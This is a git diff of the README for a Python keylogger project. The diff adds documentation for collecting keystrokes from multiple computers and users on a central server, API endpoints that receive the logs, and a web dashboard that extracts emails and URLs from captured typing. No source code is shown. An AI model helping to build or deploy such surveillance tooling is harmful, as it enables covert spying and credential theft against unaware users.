@@ -1,13 +1,25 @@
 # PythonKeylogger
 
-This project is a Keylogger written in Python.
+This project is a keylogger application that records keystrokes from multiple computers and users, stores the data on a server, and provides a web-based interface to view and analyze the recorded data.
+
+## Table of Contents
+
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [API Endpoints](#api-endpoints)
+- [Front-End Interface](#front-end-interface)
+- [Contributing](#contributing)
+- [License](#license)
 
 ## Features
 
-- Captures keyboard keystrokes
-- Saves data to a file
-- Sends data to a server
-- Stores data on a server
+- Records keystrokes from multiple computers and users.
+- Stores recorded data in a JSON file on the server.
+- Provides a web-based interface to view and analyze the recorded data.
+- Supports filtering and searching of recorded data.
+- Displays insights such as extracted emails and URLs from the recorded data.
+- Supports dark and light themes for the web interface.
 
 ## System Requirements
 
@@ -65,7 +77,24 @@ This project is a Keylogger written in Python.
    python main.py
    ```
 
-3. open http://127.0.0.1:5556 in your browser.
+3. open `frontend/index.html` in your browser.
+
+## API Endpoints
+
+- `GET /data`: Returns all keylog data as JSON.
+- `GET /computers`: Returns a list of computers and users (no logs).
+- `GET /user_data`: Returns logs for a specific user.
+- `POST /logs`: Receives and stores keylog data from clients.
+
+## Front-End Interface
+
+The front-end interface provides the following features:
+
+- **Data Viewer**: Displays a list of computers and users with recorded data.
+- **User Details**: Displays detailed logs and insights for a selected user.
+- **Filtering and Searching**: Allows filtering and searching of recorded data.
+- **Insights**: Extracts and displays emails and URLs from the recorded data.
+- **Theme Toggle**: Supports dark and light themes.
 
 ## Logging & Storage
 
